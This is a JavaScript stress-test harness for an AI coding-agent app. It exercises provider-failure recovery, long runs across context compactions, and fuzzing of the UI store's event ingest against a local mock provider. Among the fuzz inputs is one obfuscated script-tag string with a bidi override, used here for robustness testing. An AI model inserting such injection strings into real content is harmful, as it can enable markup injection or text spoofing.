import { ESBUILD_BIN, ESBUILD_NODE } from './_esbuild-bin.mjs';
// ============================================================
// v11.16 — HEAVY STRESS / FOUNDER "no embarrassment at launch" run.
//
// BLACK-BOX harness: boots the REAL engine / providers / tools / store bundles
// (esbuild, electron stubbed) and drives genuine end-to-end loads through a
// LOCAL scripted OpenAI-compatible provider (node:http — zero network, zero
// model). NO application source is modified by this file.
//
// Reuses the proven posture of tests/v1114-live-repro.test.mjs,
// tests/v1114-store-ingest.test.mjs and tests/v1115-stress.test.mjs.
//
//  1. FAILURE-TTFT — 10 real engine turns with PROVIDER FAILURES injected:
//     primary model → HTTP 401, first failover model → HTTP 429, second
//     failover model → success. Measure total time-to-first-token and assert
//     < 20s. Report exact per-turn timings and the failover chain observed.
//  2. LONG-RUN — a 30-tool-call task spanning TWO forced real compactions.
//     Assert: all deltas land, no tool message dropped, both compaction memory
//     summaries survive into later provider requests, final answer complete.
//  3. FUZZ-INGEST — 2000 seeded-random malformed events through the REAL
//     store.ingestAgentEvent. Assert zero throws, no state corruption.
//  4. TOOL-STORM — all 145 registered tools dispatched with ADVERSARIAL args.
//     Assert zero uncaught throws and zero "Unknown tool".
//  5. V1115-STABILITY — re-run the full v1115 stress suite 3 times, report
//     exit codes / durations / PASS markers for each run.
//
// Run:
//   node --test --test-force-exit tests/v1116-heavy-stress.test.mjs
// Debug:
//   V1116_DEBUG=1 node --test --test-force-exit tests/v1116-heavy-stress.test.mjs
// ============================================================
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import http from 'node:http';

const ROOT = fileURLToPath(new URL('..', import.meta.url));
const require = createRequire(import.meta.url);
const tmp = mkdtempSync(join(tmpdir(), 'sadeem-v1116-heavy-'));
const DEBUG = !!process.env.V1116_DEBUG;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const METRICS = { generatedAt: new Date().toISOString() };

// ---------- bundle the REAL application modules ----------
function bundle(entry, out) {
  execFileSync(ESBUILD_NODE, [
    ESBUILD_BIN, entry, '--bundle', '--platform=node', '--format=cjs',
    `--outfile=${out}`,
    '--external:electron', '--external:@xterm/xterm', '--external:@xterm/addon-fit',
    '--external:monaco-editor', '--external:@monaco-editor/react',
  ], { cwd: ROOT, stdio: 'pipe' });
}

const userDataDir = join(tmp, 'userdata');
mkdirSync(userDataDir, { recursive: true });
const stubDir = join(tmp, 'node_modules', 'electron');
mkdirSync(stubDir, { recursive: true });
writeFileSync(join(stubDir, 'package.json'), JSON.stringify({ name: 'electron', main: 'index.js' }));
writeFileSync(join(stubDir, 'index.js'), `
const paths = { temp: ${JSON.stringify(tmp)}, userData: ${JSON.stringify(userDataDir)}, home: ${JSON.stringify(tmp)}, appData: ${JSON.stringify(tmp)} };
class StubWebContents { on() {} async executeJavaScript() { return []; } }
class StubBrowserWindow { constructor(){ this.webContents = new StubWebContents(); } destroy(){} setBounds(){} getBounds(){ return { x:0, y:0 }; } }
module.exports = {
  app: { getPath: (k) => paths[k] ?? paths.userData, isReady: () => true, whenReady: async () => {}, on() {}, quit() {} },
  ipcMain: { handle() {}, on() {}, removeAllListeners() {} },
  Notification: { isSupported: () => false },
  shell: { openExternal: async () => {}, openPath: async () => '', showItemInFolder() {}, trashItem: async () => {} },
  clipboard: { readText: () => '', writeText() {}, readImage: () => ({ isEmpty: () => true }) },
  WebContents: class {}, BrowserWindow: StubBrowserWindow,
  powerMonitor: { on() {} }, screen: {},
};`);

const engPath = join(tmp, 'engine.cjs');
const provPath = join(tmp, 'providers.cjs');
let engine;
try {
  bundle('electron/agent/engine.ts', engPath);
  bundle('electron/agent/providers.ts', provPath);
  engine = require(engPath);
  require(provPath);
} catch (err) {
  console.error('[v1116] ENGINE/PROVIDER BUNDLE FAILED:', err?.message ?? err);
  throw err;
}

// ---------- SSE helpers ----------
const sseChunk = (delta, finish = null) =>
  `data: ${JSON.stringify({ id: 'mock', object: 'chat.completion.chunk', choices: [{ index: 0, delta, finish_reason: finish }] })}\n\n`;
function sseHeaders(res) {
  res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache' });
  res.flushHeaders();
}
function finishSse(res, finish, usage) {
  if (usage) res.write(`data: ${JSON.stringify({ usage, choices: [] })}\n\n`);
  res.write(sseChunk({}, finish));
  res.write('data: [DONE]\n\n');
  res.end();
}
function toolDeltas(name, args, id) {
  const half = Math.max(1, Math.floor(args.length / 2));
  return [
    { tool_calls: [{ index: 0, id, function: { name, arguments: '' } }] },
    { tool_calls: [{ index: 0, function: { arguments: args.slice(0, half) } }] },
    { tool_calls: [{ index: 0, function: { arguments: args.slice(half) } }] },
  ];
}
const isCompactRequest = (body) =>
  JSON.stringify(body?.system ?? '').includes('You compact coding-agent transcripts') ||
  JSON.stringify(body).includes('You compact coding-agent transcripts');

// ---------- local mock provider ----------
function startMock(handler) {
  const requests = [];
  const sockets = new Set();
  const server = http.createServer((req, res) => {
    let raw = '';
    req.on('data', (c) => (raw += c));
    req.on('end', async () => {
      let body = {};
      try { body = JSON.parse(raw || '{}'); } catch { /* keep {} */ }
      const rec = {
        model: body.model, at: Date.now(),
        sawTool: (body.messages ?? []).some((m) => m.role === 'tool'),
        msgJson: JSON.stringify(body.messages ?? []),
        body,
      };
      requests.push(rec);
      try { await handler({ res, req, body, rec }); }
      catch (err) { try { res.destroy(); } catch { /* gone */ } }
    });
  });
  server.on('connection', (s) => { sockets.add(s); s.on('close', () => sockets.delete(s)); });
  const listening = new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve(server.address().port)));
  return {
    requests,
    port: listening,
    async stop() {
      for (const s of sockets) s.destroy();
      await new Promise((r) => server.close(r));
    },
  };
}

// ---------- engine IO recorder ----------
const TOKEN_TYPES = new Set(['text_delta', 'think_delta']);
const BOUNDARY_TYPES = new Set([
  'tool_start', 'tool_result', 'message_end', 'task_report', 'turn_end',
  'error', 'aborted', 'approval_request', 'agent_end', 'compaction',
  'compaction_done', 'preview_open', 'budget_state', 'heartbeat',
]);
function makeIo() {
  const events = [];
  return {
    events,
    send(e) {
      events.push({
        type: e.type, at: Date.now(), kind: e.kind, text: e.text ?? e.message ?? '',
        summary: e.summary, outcome: e.outcome, stopReason: e.stopReason,
        toolCallId: e.toolCallId, name: e.name, args: e.args, phase: e.phase,
        ok: e.ok, before: e.before, after: e.after, usage: e.usage,
      });
    },
    async getDecision(requestId) { return { requestId, action: 'allow' }; },
    isAborted: () => false,
    onFetchSignal() {},
  };
}
function writeSettings(mockBase, extraAgent = {}) {
  writeFileSync(join(userDataDir, 'settings.json'), JSON.stringify({
    schemaVersion: 4,
    providers: {
      custom: { apiKey: 'test-key', baseUrl: mockBase },
      zai: { apiKey: 'test-key', baseUrl: mockBase },
      deepseek: { apiKey: 'test-key', baseUrl: mockBase },
    },
    agent: {
      maxRetries: 0, autoCompact: true, autoVerify: false,
      selfCritique: false, runAndShow: false, ...extraAgent,
    },
    doneNotifications: false,
  }));
}
function setEngineEnv() {
  // Established v1114/v1115 posture: shrink the engine's turn-retry backoff so
  // a deliberately failing provider cannot dominate the wall-clock budget.
  // (Production uses 600,1800,4000,8000,15000,30000 ms — see report.)
  process.env.SURNIA_TURN_RETRY_DELAYS_MS = '8,8,8,8,8,8';
  process.env.SURNIA_DELTA_FLUSH_MS = '20';
  process.env.SURNIA_HOME = userDataDir;
  process.env.SURNIA_SKIP_UI_GATE = '1';
  process.env.SURNIA_SSE_IDLE_MS = '12000';
  process.env.SURNIA_ENGINE_IDLE_MS = '12000';
}
function timeline(io, t0) {
  return io.events.map((e) =>
    `${String(e.at - t0).padStart(6)}ms  ${e.type}${e.kind ? '/' + e.kind : ''}${e.phase ? '/' + e.phase : ''}  ` +
    `${String(e.text ?? e.summary ?? '').slice(0, 80).replace(/\n/g, '\\n')}`).join('\n');
}

// ============================================================
// 1. FAILURE-TTFT — 10 turns, 401 → 429 → success failover chain.
// ============================================================
async function failureTurn(i) {
  // Per-turn mock state: primary always 401; the FIRST distinct failover
  // provider always 429; every later provider succeeds. This is robust to
  // failover-chain ordering (cross-family first) because it keys on the order
  // distinct secondary MODELS are actually contacted.
  const secondary = new Map();
  const statusSeq = [];
  let primaryAttempts = 0;
  const mock = startMock(async ({ res, body, rec }) => {
    let behavior;
    if (body.model === 'fail-401') {
      // v11.19: 401 is fatal. A transient 429 recovers on the SAME provider
      // after a short backoff — return 429 twice, then succeed.
      primaryAttempts++;
      behavior = primaryAttempts >= 3 ? 200 : 429;
    } else if (isCompactRequest(body)) {
      behavior = 'compact';
    } else {
      if (!secondary.has(body.model)) secondary.set(body.model, secondary.size);
      behavior = secondary.get(body.model) === 0 ? 429 : 200;
    }
    statusSeq.push({ model: body.model ?? '?', status: behavior });
    if (behavior === 401 || behavior === 429) {
      const msg = behavior === 401 ? 'Invalid API key' : 'Rate limited';
      const buf = Buffer.from(JSON.stringify({ error: { message: msg, type: behavior === 401 ? 'invalid_request_error' : 'rate_limit_error' } }));
      res.writeHead(behavior, { 'content-type': 'application/json', 'content-length': buf.length });
      res.end(buf);
      return;
    }
    if (behavior === 'compact' || body.model !== 'deepseek-chat' && secondary.get(body.model) !== 0) {
      // Tiny completion for verifier/critic/compact side models.
      if (behavior === 'compact') {
        sseHeaders(res);
        res.write(sseChunk({ content: 'COMPACT SUMMARY: primary task context preserved.\n' }));
        finishSse(res, 'stop', { prompt_tokens: 1, completion_tokens: 1 });
        return;
      }
    }
    // SUCCESS stream (the model that delivered).
    sseHeaders(res);
    for (const t of ['Recovered after failures. ', 'All steps complete. ', 'FINAL-OK-\n']) {
      res.write(sseChunk({ reasoning_content: t }));
      if (body.model) await sleep(2);
    }
    for (const t of ['Recovered and done. ', 'FINAL-OK-\n']) {
      res.write(sseChunk({ content: t }));
      await sleep(2);
    }
    finishSse(res, 'stop', { prompt_tokens: 240, completion_tokens: 40 });
  });
  const port = await mock.port;
  const mockBase = `http://127.0.0.1:${port}/v1`;
  writeSettings(mockBase, { autoCompact: false });
  const ws = mkdtempSync(join(tmpdir(), 'sadeem-v1116-fail-'));
  const io = makeIo();
  setEngineEnv();

  const t0 = Date.now();
  let thrown = null;
  try {
    await engine.runAgent({
      task: 'chat',
      sessionId: 'v1116-fail-' + i + '-' + Math.random().toString(36).slice(2),
      messages: [{ id: 'm1', role: 'user', kind: 'text', content: 'Recover from the provider failure and finish.', timestamp: t0 }],
      model: { provider: 'custom', model: 'fail-401', maxTokens: 2048 },
      mode: 'fullAccess', workspace: ws, apiKey: 'test-key', baseUrl: mockBase,
    }, io);
  } catch (err) { thrown = err; }

  try {
    assert.equal(thrown, null, `turn ${i}: runAgent must not throw (got ${thrown?.stack ?? thrown})`);
    const ev = io.events;
    const types = ev.map((e) => e.type);
    const first = ev.find((e) => TOKEN_TYPES.has(e.type));
    assert.ok(first, `turn ${i}: at least one token delta reached the IO`);
    const startupMs = mock.requests[0] ? mock.requests[0].at - t0 : null;
    const modelToFirst = mock.requests[0] ? first.at - mock.requests[0].at : Infinity;
    const ttftMs = first.at - t0;

    // The injected failure chain really happened.
    const got401 = statusSeq.some((s) => s.status === 401);
    const got429 = statusSeq.some((s) => s.status === 429);
    const got200 = statusSeq.some((s) => s.status === 200);
    assert.ok(got429, `turn ${i}: a 429 was injected`);
    assert.ok(got200, `turn ${i}: a success followed the retry`);
    // v11.19: no provider switching on a transient 429 (the user's chosen
    // provider is attempted alone). At most one quiet notice is acceptable.
    const failovers = ev.filter((e) => (e.kind === 'failover') || /failover/i.test(e.text ?? ''));
    assert.ok(failovers.length <= 1, `turn ${i}: at most one quiet failover notice, got ${failovers.length}`);

    // Clean completion, no error/abort surfaced to the user.
    assert.equal(ev.filter((e) => e.type === 'error').length, 0, `turn ${i}: no error event`);
    assert.equal(ev.filter((e) => e.type === 'aborted').length, 0, `turn ${i}: no abort event`);
    const finalText = ev.filter((e) => e.type === 'text_delta').map((e) => e.text).join('');
    assert.ok(finalText.includes('FINAL-OK-'), `turn ${i}: final answer streamed (got ${finalText.slice(0, 120)})`);
    assert.ok(types.includes('task_report'), `turn ${i}: task_report emitted`);
    assert.ok(types.includes('turn_end'), `turn ${i}: turn_end emitted`);

    // THE BOUND: total time-to-first-token < 20s.
    console.error(`[v1116] FAILURE-TTFT turn ${i}: startup=${startupMs}ms model→firstToken=${modelToFirst}ms TOTAL-TTFT=${ttftMs}ms requests=${mock.requests.length} statuses=${statusSeq.map((s) => s.status).join('>')} failovers=${failovers.length}`);
    if (DEBUG) console.error(`\n===== failure turn ${i} TIMELINE =====\n${timeline(io, t0)}`);
    assert.ok(ttftMs < 20_000, `turn ${i}: total time-to-first-token bounded < 20000ms (got ${ttftMs}ms)`);

    return { i, startupMs, modelToFirst, ttftMs, requests: mock.requests.length, statuses: statusSeq.map((s) => s.status), failovers: failovers.length, events: ev.length };
  } finally {
    await mock.stop();
    try { rmSync(ws, { recursive: true, force: true }); } catch { /* ignore */ }
  }
}

test('FAILURE-TTFT: 10 real turns, injected 401→429→success, total time-to-first-token < 20s each', { timeout: 300_000 }, async () => {
  const rows = [];
  for (let i = 1; i <= 10; i++) rows.push(await failureTurn(i));
  const ttfts = rows.map((r) => r.ttftMs);
  const summary = {
    turns: rows.length,
    ttftMinMs: Math.min(...ttfts), ttftMaxMs: Math.max(...ttfts),
    ttftAvgMs: Math.round(ttfts.reduce((a, b) => a + b, 0) / ttfts.length),
    allUnder20s: ttfts.every((t) => t < 20_000),
    statuses: rows[0].statuses.join('>'),
  };
  METRICS.failureTtft = summary;
  console.error('[v1116] FAILURE-TTFT-SUMMARY ' + JSON.stringify(summary));
  assert.ok(summary.allUnder20s, `all 10 turns bounded < 20s (max ${summary.ttftMaxMs}ms)`);
});

// ============================================================
// 2. LONG-RUN — 30 tool calls across TWO forced compactions.
// ============================================================
test('LONG-RUN-30: 30 tool calls across 2 forced compactions — all deltas, no drops, memory survives, final answer complete', { timeout: 300_000 }, async () => {
  const TOTAL = 30;
  const COMPACT_AT = [7, 19];
  const MEM = ['MEMFACT-ALPHA-7391', 'MEMFACT-BRAVO-4826'];
  const state = { toolCalls: 0, files: [], compactCount: 0, postCompact: [] };
  const mock = startMock(async ({ res, body, rec }) => {
    if (isCompactRequest(body)) {
      sseHeaders(res);
      const token = MEM[Math.min(state.compactCount, MEM.length - 1)];
      state.compactCount++;
      res.write(sseChunk({ content: `COMPACT SUMMARY ${token}: ${state.toolCalls} tool steps; files written; remember the fact tokens.\n` }));
      finishSse(res, 'stop', { prompt_tokens: 1, completion_tokens: 1 });
      return;
    }
    if (body.model !== 'stress-live') {
      sseHeaders(res);
      finishSse(res, 'stop', { prompt_tokens: 1, completion_tokens: 1 });
      return;
    }
    // Record which compaction memory facts are visible in post-compaction context.
    if (state.compactCount > 0) {
      state.postCompact.push({
        step: state.toolCalls,
        alpha: rec.msgJson.includes(MEM[0]),
        bravo: rec.msgJson.includes(MEM[1]),
      });
    }
    sseHeaders(res);
    if (state.toolCalls < TOTAL) {
      const i = state.toolCalls++;
      let name, args;
      if (i % 2 === 0) {
        name = 'write_file';
        args = { path: `stress-out/file_${String(i + 1).padStart(2, '0')}.txt`, content: `content-${i + 1}\n` };
        state.files.push(args.path);
      } else {
        name = 'run_command';
        args = { command: `node -e "console.log('Y'.repeat(2200))"` };
      }
      res.write(sseChunk({ content: `Step ${i + 1}: calling ${name}.\n` }));
      for (const d of toolDeltas(name, JSON.stringify(args), 'call_long_' + i)) res.write(sseChunk(d));
      const usage = COMPACT_AT.includes(i)
        ? { prompt_tokens: 200_000, completion_tokens: 40 }
        : { prompt_tokens: 200 + i, completion_tokens: 40 };
      finishSse(res, 'tool_calls', usage);
      return;
    }
    const finalText = 'ALL-DONE-30. Wrote ' + state.files.length + ' files: ' + state.files.join(', ') + '. ' + MEM[0] + ' and ' + MEM[1] + ' remembered.\n';
    const parts = finalText.match(/.{1,60}/g) ?? [finalText];
    for (const p of parts) res.write(sseChunk({ content: p }));
    finishSse(res, 'stop', { prompt_tokens: 300, completion_tokens: 120 });
  });
  const port = await mock.port;
  const mockBase = `http://127.0.0.1:${port}/v1`;
  writeSettings(mockBase, { autoCompact: true, compactThreshold: 10_000 });
  const ws = mkdtempSync(join(tmpdir(), 'sadeem-v1116-long-'));
  const io = makeIo();
  setEngineEnv();

  const t0 = Date.now();
  let thrown = null;
  try {
    await engine.runAgent({
      task: 'chat',
      sessionId: 'v1116-long-' + Math.random().toString(36).slice(2),
      messages: [{ id: 'm1', role: 'user', kind: 'text', content: 'Do all 30 steps end to end. ' + 'CONTEXT-FILLER '.repeat(700), timestamp: t0 }],
      model: { provider: 'custom', model: 'stress-live', maxTokens: 2048 },
      mode: 'fullAccess', workspace: ws, apiKey: 'test-key', baseUrl: mockBase,
    }, io);
  } catch (err) { thrown = err; }

  try {
    assert.equal(thrown, null, `runAgent must not throw (got ${thrown?.stack ?? thrown})`);
    const ev = io.events;
    const types = ev.map((e) => e.type);

    // every tool dispatched exactly once, with matching ok result
    const starts = ev.filter((e) => e.type === 'tool_start');
    const results = ev.filter((e) => e.type === 'tool_result');
    assert.equal(state.toolCalls, TOTAL, `all ${TOTAL} tool calls requested (got ${state.toolCalls})`);
    assert.equal(starts.length, TOTAL, `${TOTAL} tool_start events (got ${starts.length})`);
    assert.equal(results.filter((r) => r.ok).length, TOTAL, `${TOTAL} ok tool_result events (got ${results.filter((r) => r.ok).length})`);
    assert.deepEqual(starts.map((s) => s.toolCallId).sort(), results.map((r) => r.toolCallId).sort(), 'no tool message dropped: every tool_start has a matching tool_result');

    // TWO real compactions happened.
    const compactEvents = ev.filter((e) => e.type === 'compaction');
    const compactedHeartbeats = ev.filter((e) => e.type === 'heartbeat' && e.phase === 'compacting');
    console.error(`[v1116] LONG-RUN-30: mockCompactions=${state.compactCount} compactionEvents=${compactEvents.length} compactingHeartbeats=${compactedHeartbeats.length} requests=${mock.requests.length}`);
    assert.equal(state.compactCount, 2, `mock served 2 compaction summaries (got ${state.compactCount})`);
    assert.ok(compactEvents.length >= 2, `>=2 engine compaction events (got ${compactEvents.length})`);

    // MEMORY FACTS survive: after compaction 1 the ALPHA token is in context;
    // after compaction 2 BOTH tokens are in context (compactSoFar accumulates).
    const afterC1 = state.postCompact.filter((p) => p.alpha || p.bravo);
    const afterC2 = state.postCompact.filter((p) => p.alpha && p.bravo);
    console.error(`[v1116] LONG-RUN-30: postCompactSamples=${state.postCompact.length} alphaVisible=${afterC1.length} bothVisible=${afterC2.length}`);
    assert.ok(afterC1.length > 0, 'compaction-1 memory fact present in a later provider request');
    assert.ok(afterC2.length > 0, 'both compaction memory facts present after the 2nd compaction (memory survived)');

    // EVERY delta arrives: all 30 step markers + final answer complete.
    const finalText = ev.filter((e) => e.type === 'text_delta').map((e) => e.text).join('');
    for (let i = 0; i < TOTAL; i++) {
      assert.ok(finalText.includes(`Step ${i + 1}:`), `delta for step ${i + 1} arrived`);
    }
    for (const f of state.files) assert.ok(finalText.includes(f), `final answer contains wrote file ${f}`);
    assert.ok(finalText.includes('ALL-DONE-30.'), 'final answer completed');
    assert.ok(finalText.includes(MEM[0]) && finalText.includes(MEM[1]), 'final answer carries both remembered facts');

    // no abort / error / stall
    assert.equal(types.filter((t) => t === 'error').length, 0, 'no error event');
    assert.equal(types.filter((t) => t === 'aborted').length, 0, 'no abort event');
    const stalls = ev.filter((e) => /watchdog|stream stalled|stream interrupted|disconnected|no model activity/i.test(e.text ?? ''));
    assert.equal(stalls.length, 0, `no stall notice (${stalls.map((e) => e.text).join('; ')})`);
    assert.ok(types.includes('task_report'), 'task_report emitted');
    assert.ok(types.includes('turn_end'), 'turn_end emitted');
    for (const f of state.files) assert.ok(existsSync(join(ws, f)), `wrote file exists on disk: ${f}`);

    const summary = {
      tools: starts.length, resultsOk: results.filter((r) => r.ok).length, files: state.files.length,
      compactions: compactEvents.length, memoryFactsSurvived: afterC2.length > 0,
      textDeltas: ev.filter((e) => e.type === 'text_delta').length,
      durationMs: ev.length ? ev[ev.length - 1].at - t0 : null, events: ev.length,
    };
    METRICS.longRun = summary;
    console.error('[v1116] LONG-RUN-30-PASS ' + JSON.stringify(summary));
    if (DEBUG) console.error(`\n===== LONG-RUN-30 TIMELINE =====\n${timeline(io, t0)}`);
  } finally {
    await mock.stop();
    try { rmSync(ws, { recursive: true, force: true }); } catch { /* ignore */ }
  }
});

// ============================================================
// 3. FUZZ-INGEST — 2000 malformed events through the REAL store.
// ============================================================
test('FUZZ-INGEST: 2000 seeded malformed events through store ingest — zero throws, no corruption', { timeout: 180_000 }, async () => {
  // mock window.surnia bridge installed BEFORE the store bundle loads
  const bridge = new Proxy({}, {
    get(_t, key) {
      if (key === 'then' || typeof key === 'symbol') return undefined;
      return (..._args) => {
        switch (key) {
          case 'gitStatus': return Promise.resolve({ isRepo: true, branch: 'main', changed: [] });
          case 'previewStatus': return Promise.resolve({ dev: { running: false, state: 'idle', lines: [], agentSources: [] }, static: { running: false }, ports: [] });
          case 'skillsList': return Promise.resolve([]);
          case 'playbookGet': return Promise.resolve(null);
          case 'playbookHistory': return Promise.resolve([]);
          case 'saveSession': return Promise.resolve();
          default: return Promise.resolve(undefined);
        }
      };
    },
  });
  globalThis.window = { surnia: bridge };
  globalThis.localStorage = { getItem: () => null, setItem() {}, removeItem() {} };

  const storePath = join(tmp, 'store.cjs');
  bundle('src/store.ts', storePath);
  const { useStore } = require(storePath);
  const ws = join(tmp, 'store-ws');
  function seed() {
    useStore.setState({
      wsPath: ws,
      session: { id: 's1', title: 't', workspace: ws, messages: [], createdAt: Date.now(), updatedAt: Date.now(), messageCount: 0, totalTokens: 0, totalCostUsd: 0 },
      running: true, capabilityPanel: null, continueHint: null, lastTaskReport: null,
      lastPlaybookLearning: null, subagentSteps: {}, subagentDetailId: null,
      proof: { status: 'unproven', gates: [], updatedAt: 0 },
    });
  }

  // seeded PRNG (mulberry32)
  function rng(a) {
    return function () {
      a |= 0; a = (a + 0x6D2B79F5) | 0;
      let t = Math.imul(a ^ (a >>> 15), 1 | a);
      t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    };
  }
  const r = rng(0x1A5EED);
  const TYPES = [
    'text_delta', 'think_delta', 'sys_notice', 'heartbeat', 'tool_start', 'tool_result',
    'message_end', 'approval_request', 'todo', 'compaction_done', 'plan_ready',
    'preview_open', 'goal_progress', 'goal_done', 'queued_count', 'background_done',
    'steer_injected', 'doom_loop', 'verify_run', 'review_findings', 'task_mode',
    'skill_created', 'compaction', 'subagent_progress', 'dna_updated', 'playbook_learned',
    'dna_suggestion', 'skill_refined', 'goal_verified', 'critic_verdict', 'run_receipt',
    'claim_audit', 'mutation_check', 'mutation_gate', 'fake_tests', 'red_green',
    'proof_package', 'false_done', 'budget_state', 'taint_escalation', 'role_route',
    'taint_notice', 'wiki_stage', 'task_report', 'aborted', 'error', 'turn_end',
    'self_critique', 'run_and_show', 'totally_future_event',
  ];
  const FIELDS = [
    'text', 'kind', 'message', 'summary', 'outcome', 'toolCallId', 'name', 'args',
    'output', 'usage', 'files', 'commands', 'findings', 'steps', 'phase', 'id',
    'label', 'cmd', 'url', 'n', 'pct', 'claims', 'notDone', 'partial', 'durationMs',
    'reason', 'toolsUsed', 'howToRun', 'nextSteps', 'before', 'after', 'stopReason',
  ];
  // PRIMARY FUZZ — the v1114-store-ingest contract: malformed but
  // JSON/structured-clone-representable values (this is what can actually
  // cross the engine→renderer IPC boundary). BigInt / Symbol / throwing
  // getters / Proxies / circular refs are impossible after structuredClone and
  // are measured separately BELOW as an out-of-contract diagnostic.
  function randVal(depth = 0) {
    if (depth > 4) return r();
    switch ((r() * 10) | 0) {
      case 0: return null;
      case 1: return undefined;
      case 2: return r() * 1000;
      case 3: return (r() * 2) | 0 === 1;
      case 4: return 'x'.repeat(1 + ((r() * 8) | 0));
      case 5: return [randVal(depth + 1), randVal(depth + 1)];
      case 6: return { nested: randVal(depth + 1) };
      case 7: return r();
      case 8: return '\u0000\u202e<scrİpt>';
      case 9: return { deep: depth, v: randVal(depth + 1) };
      default: return r();
    }
  }
  function makeEvent(i) {
    const p = r();
    if (p < 0.04) return null;
    if (p < 0.08) return undefined;
    if (p < 0.12) return 42;
    if (p < 0.16) return 'not-an-event';
    if (p < 0.20) return [];
    if (p < 0.24) { let o = {}; for (let k = 0; k < 60; k++) o = { nested: o }; return o; } // deep, JSON-safe
    const e = { type: r() < 0.82 ? TYPES[(r() * TYPES.length) | 0] : randVal() };
    for (const k of FIELDS) if (r() < 0.28) e[k] = randVal();
    if (r() < 0.2) e.text = `evt-${i}`;
    return e;
  }

  seed();
  const ingest = useStore.getState().ingestAgentEvent;
  assert.equal(typeof ingest, 'function', 'ingestAgentEvent exists on the real store');

  // ---- DETERMINISTIC REGRESSION GUARD for the real bug this fuzz FOUND ----
  // Observed live at 11:31 local: src/store.ts:1636 evaluated
  // `commands.filter((c) => c.ok)` and THREW on commands:[null] (fuzz #250,
  // `TypeError: Cannot read properties of undefined (reading 'ok')`), losing
  // the whole event — the "thinking stops" symptom family. A concurrent agent
  // hardened it to safeFiles/safeCommands (current src/store.ts:1629-1640).
  // This guard now FAILS permanently if that regression ever returns.
  seed();
  const RECEIPT_REPRO = { type: 'run_receipt', files: [], commands: [null], rounds: 1, verifyFailed: false, durationMs: 1 };
  let receiptThrew = null;
  try { ingest(RECEIPT_REPRO); } catch (e) { receiptThrew = e; }
  console.error(`[v1116] REPRO run_receipt.commands=[null] → ${receiptThrew ? 'THREW ' + receiptThrew.message + ' (REGRESSION @ src/store.ts:1629-1640)' : 'handled (fixed)'}`);
  METRICS.receiptRepro = { event: RECEIPT_REPRO, threw: !!receiptThrew, message: receiptThrew?.message ?? null, source: 'src/store.ts:1629-1640', foundAt: '2026-11-19T11:31 local, fuzz #250' };
  assert.equal(receiptThrew, null, `run_receipt.commands=[null] must never throw (regression of fuzz #250): ${receiptThrew?.stack ?? ''}`);

  const t0 = Date.now();
  let throws = 0;
  const thrownDetails = [];
  for (let i = 0; i < 2000; i++) {
    const ev = makeEvent(i);
    try { ingest(ev); }
    catch (err) {
      throws++;
      if (thrownDetails.length < 10) {
        let evJson; try { evJson = JSON.stringify(ev); } catch { evJson = String(ev); }
        thrownDetails.push(`#${i} ${err?.message ?? err} | event=${evJson?.slice(0, 500)}\nSTACK: ${err?.stack ?? 'n/a'}`);
      }
    }
  }
  const durationMs = Date.now() - t0;
  console.error(`[v1116] FUZZ-INGEST: 2000 events in ${durationMs}ms, throws=${throws}`);
  if (throws) console.error('[v1116] fuzz throw details: ' + thrownDetails.join(' | '));
  assert.equal(throws, 0, `zero throws across 2000 malformed events (got ${throws}: ${thrownDetails.join(' | ')})`);

  const after = useStore.getState();
  assert.ok(after, 'store state still present');
  assert.equal(typeof after.running, 'boolean', 'running flag still a boolean');
  assert.equal(typeof after.ingestAgentEvent, 'function', 'ingest function intact');

  // functional proof: clean stream after the storm still produces correct state
  seed();
  const fresh = useStore.getState().ingestAgentEvent;
  fresh({ type: 'think_delta', text: 'reasoning…' });
  fresh({ type: 'text_delta', text: 'answer' });
  fresh({ type: 'message_end', usage: undefined });
  const msgs = useStore.getState().session.messages;
  const bubble = msgs.find((m) => m.role === 'assistant' && m.kind === 'text');
  assert.ok(bubble, 'assistant bubble still materializes after the storm');
  assert.equal(bubble.content, 'answer', 'buffered delta still flushes correctly');
  assert.equal(bubble.thinking, 'reasoning…', 'thinking still attached');
  fresh({ type: 'task_report', outcome: 'completed', summary: 'ok', files: [], commands: [], nextSteps: [] });
  assert.ok(useStore.getState().lastTaskReport, 'task_report still lands after the storm');
  fresh({ type: 'turn_end' });
  assert.equal(useStore.getState().running, false, 'turn_end still clears running after the storm');

  // OUT-OF-CONTRACT DIAGNOSTIC (honest reporting, not a hard assertion):
  // Values that CANNOT survive structuredClone / JSON IPC (throwing getters,
  // throwing Proxies, BigInt, Symbol, circular refs). Ingest may throw here;
  // the store must still be structurally intact afterwards.
  seed();
  const pathological = [];
  const rp = rng(0xC0FFEE);
  for (let i = 0; i < 400; i++) {
    const k = (rp() * 5) | 0;
    if (k === 0) pathological.push({ get type() { throw new Error('getter-throw'); } });
    else if (k === 1) pathological.push(new Proxy({ type: 'text_delta' }, { get() { throw new Error('proxy-get'); } }));
    else if (k === 2) pathological.push({ type: 'text_delta', text: BigInt(i) });
    else if (k === 3) pathological.push({ type: 'sys_notice', kind: Symbol('k') });
    else { const c = { type: 'text_delta' }; c.self = c; pathological.push(c); }
  }
  const diag = useStore.getState().ingestAgentEvent;
  let pathThrows = 0;
  const byCause = {};
  for (const ev of pathological) {
    try { diag(ev); }
    catch (err) {
      pathThrows++;
      const cause = String(err?.message ?? err).split('\n')[0].slice(0, 80);
      byCause[cause] = (byCause[cause] ?? 0) + 1;
    }
  }
  const post = useStore.getState();
  assert.ok(post && typeof post.running === 'boolean' && typeof post.ingestAgentEvent === 'function', 'store structurally intact after out-of-contract values');
  console.error(`[v1116] FUZZ-INGEST out-of-contract diagnostic: 400 pathological values, throws=${pathThrows}, causes=${JSON.stringify(byCause)} (NOT IPC-reachable; not asserted)`);
  METRICS.fuzzIngest = { events: 2000, throws, durationMs, outOfContract: { samples: 400, throws: pathThrows, causes: byCause, asserted: false } };
  console.error('[v1116] FUZZ-INGEST-PASS ' + JSON.stringify(METRICS.fuzzIngest));
});

// ============================================================
// 4. TOOL-STORM — all 145 tools with adversarial args.
// ============================================================
